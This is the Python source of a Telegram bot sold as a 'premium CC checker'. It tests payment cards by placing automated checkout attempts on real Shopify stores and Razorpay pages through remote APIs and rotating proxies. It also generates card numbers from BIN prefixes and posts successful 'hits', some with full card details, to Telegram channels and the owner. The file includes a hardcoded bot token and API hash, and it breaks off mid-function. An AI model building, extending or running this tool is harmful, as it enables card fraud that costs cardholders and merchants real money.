lfrom telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import sqlite3
import random
import time
import re
import json
import secrets
import string
from datetime import datetime, timedelta
from telethon.errors import FloodWaitError
import pytz
import logging

# ============================================================
# CONFIGURATION
# ============================================================

BOT_TOKEN = '8698925083:AAEt63FCx36YTkkNGj3_ed56r1KAX6sgf0o'
API_ID = 31862672
API_HASH = '0d03edf37e7176f8e51b1edd3d20c81b'
OWNER_ID = 7218406158

# Channels
CHANNEL_1 = "@THENETWORKOEJAY"
CHANNEL_2 = "@THENETWORKOFJAY"
HIT_CHANNEL = "THENETWORKOEJAY"
FEEDBACK_CHANNEL = "THENETWORKOFJAY"

# Bot Info
BOT_NAME = "𝙋𝙍𝙄𝙈𝙀 𝙓 𝙉𝙀𝙓𝙐𝙎 ♦️"
BOT_TAGLINE = "⚡ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘾𝘾 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 ⚡"
OWNER_NAME = "𝐇𝐞𝐥𝐥𝐨"

# Files
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
PREMIUM_FILE = 'premium.txt'
KEYS_FILE = "keys.txt"
VERIFIED_FILE = "verified_users.txt"
BANNED_FILE = "banned_users.txt"
BLOCK_FILE = "blocked_users.txt"
DAILY_USAGE_FILE = "daily_usage.json"
USER_SITES_FILE = 'user_sites.json'
USER_PROXY_FILE = 'user_proxy.json'
RZ_SITES_FILE = 'rz_sites.txt'
MULTI_KEYS_FILE = 'multi_device_keys.json'
CONFIG_FILE = 'config.json'
PHOTO_URL = "https://i.pinimg.com/1200x/3e/7a/2e/3e7a2e39526c57bb397ae134a58b4c9c.jpg"

# ============================================================
# PREMIUM EMOJIS
# ============================================================

PREMIUM_EMOJI_IDS = {
    "✅": "6298612102709909362",
    "❌": "5440681540541502133",
    "⚡": "6026367225466720832",
    "💠": "5971837723676249096",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🌚": "6298678524379137990",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "5427168083074628963",
    "🔥": "5267500801240092311",
    "💰": "6190336264940559752",
    "🤩": "6267091732861555879",
    "✔️": "6206479140040743133",
    "⭐": "5267500801240092311",
    "💳": "5800709991627232190",
    "🏧": "4967738760021148319",
    "🔗": "4958689671950369798",
    "🫥": "5325731315004218660",
    "⏱": "5382194935057372936",
    "⚡️": "5042334757040423886",
    "👑": "5039727497143387500",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ============================================================
# API CONFIG
# ============================================================

API_MAP = {
    "a1": "http://cozy-abundance-production-ea47.up.railway.app/shopify",
    "a2": "https://bao-production-6dfe.up.railway.app/shopify",
    "a3": "http://cozy-abundance-production-ea47.up.railway.app/shopify",
    "a4": "https://lucid-flow-production-ebd1.up.railway.app/shopify",
    "a5": "",
}

def get_api():
    return random.choice(list(API_MAP.values()))

# ============================================================
# DEAD INDICATORS
# ============================================================

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

# ============================================================
# BOT INIT
# ============================================================

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
user_check_locks = {}
_verified_cache = {}
last_click = {}

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)''')
    conn.commit()
    conn.close()

def save_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except:
        pass

def get_all_users():
    try:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM users")
        return [row[0] for row in c.fetchall()]
    except:
        return []

# ============================================================
# FILE HELPERS
# ============================================================

def read_lines(filepath):
    if not os.path.exists(filepath):
        return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def write_lines(filepath, lines):
    with open(filepath, 'w', encoding='utf-8') as f:
        for line in lines:
            f.write(f"{line}\n")

def load_sites():
    sites = read_lines(SITES_FILE)
    if not sites:
        default = [
            "https://paperieplanning.com",
            "https://punisher.myshopify.com",
            "https://dev-goodybeads.myshopify.com",
            "https://blackhelmetapparel.com",
        ]
        write_lines(SITES_FILE, default)
        return default
    return sites

def load_proxies():
    return read_lines(PROXY_FILE)

def load_razorpay_sites():
    sites = read_lines(RZ_SITES_FILE)
    if not sites:
        return ["https://pages.razorpay.com/BusinessGarh"]
    return sites

def is_premium(user_id):
    users = read_lines(PREMIUM_FILE)
    user_id_str = str(user_id)
    for line in users:
        if '|' in line:
            uid, exp = line.split('|', 1)
            if uid == user_id_str:
                try:
                    exp_date = datetime.strptime(exp.strip(), "%Y-%m-%d %H:%M:%S")
                    if exp_date > datetime.now():
                        return True
                except:
                    pass
    return False

def is_admin(user_id):
    return str(user_id) == str(OWNER_ID)

def is_banned(user_id):
    return str(user_id) in read_lines(BANNED_FILE)

def ban_user(user_id):
    banned = read_lines(BANNED_FILE)
    if str(user_id) not in banned:
        banned.append(str(user_id))
        write_lines(BANNED_FILE, banned)
        return True
    return False

def unban_user(user_id):
    banned = read_lines(BANNED_FILE)
    if str(user_id) in banned:
        banned.remove(str(user_id))
        write_lines(BANNED_FILE, banned)
        return True
    return False

def save_verified(user_id):
    verified = read_lines(VERIFIED_FILE)
    if str(user_id) not in verified:
        verified.append(str(user_id))
        write_lines(VERIFIED_FILE, verified)

def is_verified(user_id):
    return str(user_id) in read_lines(VERIFIED_FILE)

# ============================================================
# BLOCK FUNCTIONS
# ============================================================

def block_user(user_id):
    if not is_blocked(user_id):
        with open(BLOCK_FILE, "a") as f:
            f.write(f"{user_id}\n")

def unblock_user(user_id):
    if is_blocked(user_id):
        blocked = get_blocked_users()
        blocked.remove(str(user_id))
        with open(BLOCK_FILE, "w") as f:
            for uid in blocked:
                f.write(f"{uid}\n")

def is_blocked(user_id):
    try:
        with open(BLOCK_FILE, "r") as f:
            blocked = f.read().splitlines()
        return str(user_id) in blocked
    except:
        return False

def get_blocked_users():
    try:
        with open(BLOCK_FILE, "r") as f:
            return f.read().splitlines()
    except:
        return []

# ============================================================
# MULTI-DEVICE KEY FUNCTIONS
# ============================================================

def load_keys():
    try:
        with open(MULTI_KEYS_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(MULTI_KEYS_FILE, "w") as f:
        json.dump(keys, f, indent=2)

def generate_multi_device_key(days, device_limit):
    prefix = "PRIMENEXUS-MULTI"
    random_part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    key = f"{prefix}-{random_part}-{days}D-{device_limit}U"
    
    keys = load_keys()
    keys[key] = {
        "days": days,
        "device_limit": device_limit,
        "used": 0,
        "users": [],
        "created": datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %H:%M:%S"),
        "active": True
    }
    save_keys(keys)
    return key

def redeem_multi_device_key(key, user_id):
    keys = load_keys()
    
    if key not in keys:
        return "invalid"
    
    key_data = keys[key]
    
    if not key_data.get("active", False):
        return "invalid"
    
    if str(user_id) in key_data.get("users", []):
        return "used"
    
    if is_premium(user_id) or is_admin(user_id):
        return "already_premium"
    
    if key_data["used"] >= key_data["device_limit"]:
        return "device_limit_reached"
    
    key_data["used"] += 1
    key_data["users"].append(str(user_id))
    
    if key_data["used"] >= key_data["device_limit"]:
        key_data["active"] = False
    
    save_keys(keys)
    
    days = key_data["days"]
    expiry = (datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        with open(PREMIUM_FILE, "a") as f:
            f.write(f"{user_id}|{expiry}\n")
    except:
        pass
    
    return "success"

def get_key_info(key):
    keys = load_keys()
    key_data = keys.get(key, {})
    
    if not key_data:
        return None
    
    return {
        "days": key_data.get("days", 0),
        "limit": key_data.get("device_limit", 0),
        "used": key_data.get("used", 0),
        "users": key_data.get("users", []),
        "created": key_data.get("created", "Unknown"),
        "active": key_data.get("active", False)
    }

# ============================================================
# DAILY LIMITS
# ============================================================

def get_daily_usage(user_id):
    data = {}
    if os.path.exists(DAILY_USAGE_FILE):
        with open(DAILY_USAGE_FILE, 'r') as f:
            data = json.load(f)
    today = datetime.now().date().isoformat()
    if str(user_id) not in data or data[str(user_id)]['date'] != today:
        data[str(user_id)] = {'count': 0, 'date': today}
    return data[str(user_id)]['count']

def update_daily_usage(user_id):
    data = {}
    if os.path.exists(DAILY_USAGE_FILE):
        with open(DAILY_USAGE_FILE, 'r') as f:
            data = json.load(f)
    today = datetime.now().date().isoformat()
    if str(user_id) not in data or data[str(user_id)]['date'] != today:
        data[str(user_id)] = {'count': 0, 'date': today}
    data[str(user_id)]['count'] += 1
    with open(DAILY_USAGE_FILE, 'w') as f:
        json.dump(data, f)

def check_limit(user_id):
    if is_admin(user_id) or is_premium(user_id):
        return True
    return get_daily_usage(user_id) < 150

# ============================================================
# CC HELPERS
# ============================================================

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    cards = []
    for match in re.findall(pattern, text):
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def generate_cc(bin_prefix, count=10):
    cards = []
    for _ in range(count):
        remaining = 16 - len(bin_prefix)
        card_num = bin_prefix + ''.join(str(random.randint(0,9)) for _ in range(remaining))
        month = random.randint(1, 12)
        year = random.randint(2026, 2030)
        cvv = random.randint(100, 999)
        cards.append(f"{card_num[:16]}|{month:02d}|{year}|{cvv}")
    return cards

# ============================================================
# BIN INFO
# ============================================================

async def get_bin_info(card):
    try:
        bin_num = card[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_num}') as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return {
                        'brand': data.get('brand', '-'),
                        'bank': data.get('bank', '-'),
                        'country': data.get('country_name', '-'),
                        'flag': data.get('country_flag', ''),
                        'type': data.get('type', '-'),
                        'level': data.get('level', '-')
                    }
    except:
        pass
    return {'brand': '-', 'bank': '-', 'country': '-', 'flag': '', 'type': '-', 'level': '-'}

def get_time():
    return datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%I:%M:%S %p IST")

# ============================================================
# CHECK CARD FUNCTION
# ============================================================

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Error', 'message': 'Invalid format', 'card': card, 'retry': True}
        
        if not site.startswith("http"):
            site = f"https://{site}"
        
        api_url = get_api()
        url = f"{api_url}?site={site}&cc={card}&proxy={proxy}"
        
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        
        msg = str(raw.get('Response', '')).strip().lower()
        price = raw.get('Price', '-')
        gateway = raw.get('Gateway', raw.get('Gate', 'Auto Shopify'))
        status = raw.get('Status', '')
        
        DEAD_TRIGGERS = [
            "request timeout", "timeout", "connection failed", "connection reset",
            "connection refused", "timed out", "site error", "site dead",
            "cloudflare", "captcha_required", "invalid url", "error in 1st req",
            "access denied", "tlsv1 alert", "ssl routines", "could not resolve",
            "domain name not found", "name or service not known",
            "openssl ssl_connect", "empty reply from server", "httperror504",
            "http error", "unreachable", "ssl error", "502", "503", "504",
            "bad gateway", "service unavailable", "gateway timeout",
            "network error", "failed to detect product", "failed to create checkout",
            "failed to tokenize card", "failed to get proposal data",
            "submit rejected", "submit rejected:", "handle error", "http 404"
        ]
        
        if any(x in msg for x in DEAD_TRIGGERS):
            return {
                'status': 'Site Error',
                'message': msg[:150],
                'card': card,
                'retry': True,
                'site': site,
                'gateway': gateway,
                'price': price
            }
        
        CHARGED_TRIGGERS = [
            "charged", "order completed", "order_placed", "order_paid",
            "insufficient_funds", "thank you", "payment successful"
        ]
        
        if status == "Charged" or any(x in msg for x in CHARGED_TRIGGERS):
            return {
                'status': 'Charged',
                'message': msg[:150],
                'card': card,
                'price': price,
                'gateway': gateway,
                'site': site,
                'retry': False
            }
        
        APPROVED_TRIGGERS = [
            'otp_required', '3ds_required', 'approved', 'success', 'invalid_cvv',
            'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc',
            'incorrect cvc', 'incorrect_zip', 'incorrect zip'
        ]
        
        if status == 'Approved' or any(x in msg for x in APPROVED_TRIGGERS):
            return {
                'status': 'Approved',
                'message': msg[:150],
                'card': card,
                'price': price,
                'gateway': gateway,
                'site': site,
                'retry': False
            }
        
        if "card_declined" in msg or "declined" in msg:
            return {
                'status': 'Dead',
                'message': msg[:150],
                'card': card,
                'price': price,
                'gateway': gateway,
                'site': site,
                'retry': False
            }
        
        return {
            'status': 'Error',
            'message': msg[:150] or 'Unknown',
            'card': card,
            'retry': True,
            'gateway': gateway,
            'price': price,
            'site': site
        }
        
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except json.JSONDecodeError:
        return {'status': 'Site Error', 'message': 'Invalid JSON response', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Error', 'message': str(e)[:100], 'card': card, 'retry': True}

# ============================================================
# CHECK CARD WITH RETRY
# ============================================================

async def check_card_with_retry(card, sites, proxies, max_retries=8):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card}
    
    used_sites = set()
    used_proxies = set()
    failed_attempts = 0
    
    for attempt in range(max_retries):
        available_sites = [s for s in sites if s not in used_sites]
        if not available_sites:
            used_sites.clear()
            available_sites = sites
        
        site = random.choice(available_sites)
        used_sites.add(site)
        
        available_proxies = [p for p in proxies if p not in used_proxies]
        if not available_proxies:
            used_proxies.clear()
            available_proxies = proxies
        
        proxy = random.choice(available_proxies)
        used_proxies.add(proxy)
        
        result = await check_card(card, site, proxy)
        result['site'] = site
        
        if not result.get('retry', False):
            return result
        
        if result.get('status') == 'Site Error':
            failed_attempts += 1
            await asyncio.sleep(0.5)
            continue
        
        failed_attempts += 1
        await asyncio.sleep(0.5)
    
    return {
        'status': 'Dead',
        'message': f'All {max_retries} attempts failed',
        'card': card,
        'failed_attempts': failed_attempts
    }

# ============================================================
# RAZORPAY CHECK
# ============================================================

async def check_card_razorpay(card, proxy, amount=1):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Error', 'message': 'Invalid format', 'card': card}
        
        site = random.choice(load_razorpay_sites())
        base_url = f"https://auto-razorpay-nano.vercel.app/hit?Key=aiojames&Site={site}&amount={amount}&cc={card}&proxy={proxy}"
        
        for attempt in range(5):
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                    async with session.get(base_url, ssl=False) as resp:
                        raw_text = await resp.text()
                        
                        if not raw_text or len(raw_text) < 5:
                            if attempt < 4:
                                await asyncio.sleep(1)
                                continue
                            return {'status': 'Dead', 'message': 'Empty Response', 'card': card}
                        
                        try:
                            raw = json.loads(raw_text)
                        except json.JSONDecodeError:
                            if attempt < 4:
                                await asyncio.sleep(1)
                                continue
                            return {'status': 'Dead', 'message': 'Invalid JSON', 'card': card}
                        
                        response_msg = str(raw.get('response', raw.get('Response', ''))).lower()
                        status = raw.get('status', raw.get('Status', ''))
                        price = raw.get('Price', '1')
                        
                        if status == "Charged" or any(x in response_msg for x in ['charged', 'success', 'order completed', 'order_paid']):
                            return {'status': 'Charged', 'message': response_msg[:150], 'card': card, 'price': price, 'gateway': 'Razorpay'}
                        
                        if status == "Approved" or any(x in response_msg for x in ['approved', 'otp', '3ds']):
                            return {'status': 'Approved', 'message': response_msg[:150], 'card': card, 'price': price, 'gateway': 'Razorpay'}
                        
                        return {'status': 'Dead', 'message': response_msg[:150] or 'Declined', 'card': card, 'price': price, 'gateway': 'Razorpay'}
                        
            except asyncio.TimeoutError:
                if attempt < 4:
                    await asyncio.sleep(1)
                    continue
                return {'status': 'Dead', 'message': 'Timeout', 'card': card}
            except Exception:
                if attempt < 4:
                    await asyncio.sleep(1)
                    continue
                return {'status': 'Dead', 'message': 'Error', 'card': card}
        
        return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card}
        
    except Exception as e:
        return {'status': 'Error', 'message': str(e)[:100], 'card': card}

# ============================================================
# PROXY CHECK FUNCTIONS
# ============================================================

async def check_proxy(proxy):
    for attempt in range(1, 6):
        try:
            proxy = proxy.strip()
            test_card = "5154623245618097|03|2032|156"
            
            test_sites = [
                "https://paperieplanning.com",
                "https://punisher.myshopify.com",
                "https://dev-goodybeads.myshopify.com",
                "https://blackhelmetapparel.com",
                "https://kingdomcomecards.com"
            ]
            test_site = random.choice(test_sites)
            
            api_url = get_api()
            url = f"{api_url}?site={test_site}&cc={test_card}&proxy={proxy}"
            
            timeout = aiohttp.ClientTimeout(total=12)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url) as resp:
                    raw = await resp.json(content_type=None)
            
            response = str(raw.get("Response", "")).lower()
            
            DEAD = (
                "proxy dead", "invalid proxy format", "no proxy",
                "proxy error", "connection refused", "connection reset",
                "timeout", "timed out", "407", "502", "503", "504",
                "bad gateway", "gateway timeout", "socks error",
                "proxy connection failed", "tunnel connection failed",
                "cannot connect to proxy", "proxy rejected"
            )
            
            if any(x in response for x in DEAD):
                if attempt < 5:
                    await asyncio.sleep(2)
                    continue
                return {"alive": False}
            
            return {"alive": True}
            
        except Exception as e:
            if attempt < 5:
                await asyncio.sleep(2)
                continue
            return {"alive": False}
    
    return {"alive": False}

async def test_proxy(proxy):
    return await check_proxy(proxy)

# ============================================================
# SITE CHECK FUNCTIONS
# ============================================================

async def check_one_site(session, site):
    try:
        if not site.startswith("http"):
            site = "https://" + site

        async with session.get(site, allow_redirects=True) as resp:
            if resp.status < 500:
                return site, True
            return site, False
    except:
        return site, False

async def fast_site_check(sites):
    timeout = aiohttp.ClientTimeout(total=8)
    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [check_one_site(session, site) for site in sites]
        results = await asyncio.gather(*tasks)
    
    alive = []
    dead = 0
    for site, ok in results:
        if ok:
            alive.append(site)
        else:
            dead += 1
    return alive, dead

# ============================================================
# USER SITE FUNCTIONS
# ============================================================

async def load_user_sites():
    if not os.path.exists(USER_SITES_FILE):
        return {}
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

async def save_user_sites(data):
    with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def get_user_sites_sync(user_id):
    if not os.path.exists(USER_SITES_FILE):
        return []
    try:
        with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get(str(user_id), [])
    except:
        return []

async def add_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site not in user_sites:
        user_sites.append(site)
        data[str(user_id)] = user_sites
        await save_user_sites(data)
        return True
    return False

async def remove_user_site(user_id, site):
    data = await load_user_sites()
    user_sites = data.get(str(user_id), [])
    if site in user_sites:
        user_sites.remove(site)
        if user_sites:
            data[str(user_id)] = user_sites
        else:
            data.pop(str(user_id), None)
        await save_user_sites(data)
        return True
    return False

async def clear_user_sites(user_id):
    data = await load_user_sites()
    if str(user_id) in data:
        del data[str(user_id)]
        await save_user_sites(data)
        return True
    return False

# ============================================================
# USER PROXY FUNCTIONS
# ============================================================

async def load_user_proxies():
    if not os.path.exists(USER_PROXY_FILE):
        return {}
    try:
        with open(USER_PROXY_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            if content:
                return json.loads(content)
            return {}
    except:
        return {}

async def save_user_proxies(data):
    try:
        os.makedirs(os.path.dirname(USER_PROXY_FILE) or '.', exist_ok=True)
        with open(USER_PROXY_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except:
        return False

async def get_user_proxies_sync(user_id):
    data = await load_user_proxies()
    return data.get(str(user_id), [])

async def add_user_proxy(user_id, proxy):
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    if proxy not in user_proxies:
        user_proxies.append(proxy)
        data[str(user_id)] = user_proxies
        await save_user_proxies(data)
        return True
    return False

async def remove_user_proxy(user_id, proxy):
    data = await load_user_proxies()
    user_proxies = data.get(str(user_id), [])
    if proxy in user_proxies:
        user_proxies.remove(proxy)
        if user_proxies:
            data[str(user_id)] = user_proxies
        else:
            data.pop(str(user_id), None)
        await save_user_proxies(data)
        return True
    return False

# ============================================================
# HIT SENDING FUNCTIONS
# ============================================================

async def send_hit_to_channel(user_id, result, username):
    try:
        if result.get('status') not in ['Charged', 'Approved']:
            return
        
        card = result.get('card', '')
        gateway = result.get('gateway', 'Auto Shopify')
        price = result.get('price', '-')
        msg = result.get('message', '')[:120]
        
        if '|' in card:
            card_num = card.split('|')[0]
            card_hidden = card_num[:6] + "******" + card_num[-4:]
        else:
            card_hidden = card
        
        bin_info = await get_bin_info(card)
        
        plan = "👑 Admin" if is_admin(user_id) else ("💎 Premium" if is_premium(user_id) else "🆓 Free")
        
        status_text = "Charged 💎" if result['status'] == 'Charged' else "Approved 🔥"
        
        message = f"""<b>✅ HIT DETECTED ↬ {status_text}</b>
━━━━━━━━━━━━━━━━━
<b>💠 Gateway:</b> {gateway}
<b>💳 CC:</b> <code>{card_hidden}</code>
<b>🏦 Bank:</b> {bin_info.get('bank', '-')}
<b>🌍 Country:</b> {bin_info.get('country', '-')} {bin_info.get('flag', '')}
<b>💎 Response:</b> {msg}
<b>💰 Price:</b> ${price}
━━━━━━━━━━━━━━━━━
<b>👤 User:</b> <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""
        
        try:
            await bot.send_message(f"@{HIT_CHANNEL}", premium_emoji(message), parse_mode='html')
        except:
            pass
        
        try:
            await bot.send_message(OWNER_ID, premium_emoji(message), parse_mode='html')
        except:
            pass
            
    except Exception as e:
        print(f"Hit send error: {e}")

async def send_hit_to_user(user_id, result):
    try:
        if result.get('status') not in ['Charged', 'Approved']:
            return
        
        card = result.get('card', '')
        gateway = result.get('gateway', 'Auto Shopify')
        price = result.get('price', '-')
        msg = result.get('message', '')[:150]
        
        bin_info = await get_bin_info(card)
        
        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "PAID ✅"
        else:
            status_emoji = "🔥"
            status_text = "LIVE ✅"
        
        message = f"""<b>{status_emoji} HIT DETECTED</b>
━━━━━━━━━━━━━━━━━━━━
<b>💳 CC:</b> <tg-spoiler><code>{card}</code></tg-spoiler>
<b>✅ Status:</b> {status_emoji} {status_text}
<b>📝 Response:</b> {msg}
━━━━━━━━━━━━━━━━━━━━
<b>🌐 Gateway:</b> {gateway}
<b>💰 Price:</b> ${price}
<b>🏦 Bank:</b> {bin_info.get('bank', '-')}
<b>🌍 Country:</b> {bin_info.get('country', '-')} {bin_info.get('flag', '')}
<b>⏳ Time:</b> {get_time()}"""
        
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
        
        buttons = [[Button.inline("📋 COPY CC", f"copycc_{card}".encode())]]
        await bot.send_message(user_id, premium_emoji("📋 **Click to copy CC:**"), buttons=buttons, parse_mode='html')
        
    except Exception as e:
        print(f"Hit send to user error: {e}")

async def send_realtime_hit_group(user_id, result, hit_type, username):
    try:
        if result['status'] != 'Charged':
            return

        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '0.00')
        
        response_msg = str(result.get('message', 'Unknown')).lower()
        if "order_placed" in response_msg:
            response_msg = "ORDER_PLACED"
        elif "order_paid" in response_msg:
            response_msg = "ORDER_PAID"
        elif "insufficient_funds" in response_msg:
            response_msg = "INSUFFICIENT_FUNDS"
        elif "charged" in response_msg:
            response_msg = "CHARGED"
        elif "thank you" in response_msg:
            response_msg = "PAYMENT_SUCCESSFUL"
        else:
            response_msg = response_msg.replace("_", " ").upper()[:60]
        
        if is_admin(user_id):
            plan = "admin 👑"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"
        
        card_full = result.get('card', '')
        if '|' in card_full:
            card_num = card_full.split('|')[0]
            if len(card_num) >= 10:
                card_hidden = card_num[:6] + "******" + card_num[-4:]
            else:
                card_hidden = card_num[:6] + "****"
        else:
            card_hidden = "****"

        status_text = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 💎"

        message = f"""𝗛𝗜𝗧 → {status_text}
𝗚𝗘𝗧 → <code>{gateway} {price} USD</code>
RES✅ → <code>{response_msg}</code>
𝗨𝗦𝗘𝗥 → <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""

        buttons = [[Button.url("𝙋𝙍𝙄𝙈𝙀 𝙓 𝙉𝙀𝙓𝙐𝙎 ♦️", url="https://t.me/Prime_x_Nexus_bot", style="primary")]]

        try:
            msg = await bot.send_message("THENETWORKOFJAY", premium_emoji(message), parse_mode='html', buttons=buttons, silent=True)
            await bot.send_reaction("THENETWORKOFJAY", msg.id, "💎")
        except:
            pass

        try:
            await bot.send_message(OWNER_ID, premium_emoji(message), parse_mode='html')
        except:
            pass

    except Exception as e:
        print(f"send_realtime_hit_group error: {e}")

async def send_realtime_hit_dm(user_id, result, hit_type, username):
    try:
        if result["status"] not in ("Approved", "Charged"):
            return

        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "Auto Shopify")
        price = result.get("price", "-")
        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        
        response_msg = str(result.get('message', 'Unknown Response'))[:150]
        currency = "₹" if is_razorpay else ""
        current_time = get_time()

        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "Charged 💎"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "Live 🔥"
        else:
            status_emoji = "❌"
            status_text = "Dead ❌"

        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"

        message = f"""[❆] {status_text}

💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {currency}{price}
──────────

Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{username}</a> [{plan}]
🤩 ➳ <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a>"""

        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except Exception as e:
        print(f"DM hit error: {e}")

async def send_hit_to_admin(result, user_id, hit_type):
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "Auto Shopify")
        price = result.get("price", "-")
        response_msg = str(result.get('message', 'Unknown Response'))[:180]

        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "Charged 💎"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "Live 🔥"
        else:
            status_emoji = "❌"
            status_text = "Dead ❌"

        current_time = get_time()

        try:
            sender = await bot.get_entity(user_id)
            first_name = sender.first_name or "Unknown"
            tg_username = "@" + sender.username if sender.username else "No Username"
        except:
            first_name = "Unknown"
            tg_username = "No Username"

        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"

        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        currency_symbol = "₹" if is_razorpay else ""

        admin_msg = f"""[❆] {status_text}

👤 {tg_username} | ID: <code>{user_id}</code>

💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {currency_symbol}{price}
──────────

Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{first_name}</a> [{plan}]
🤩 ➳ <a href="tg://user?id={OWNER_ID}">{OWNER_NAME}</a>"""

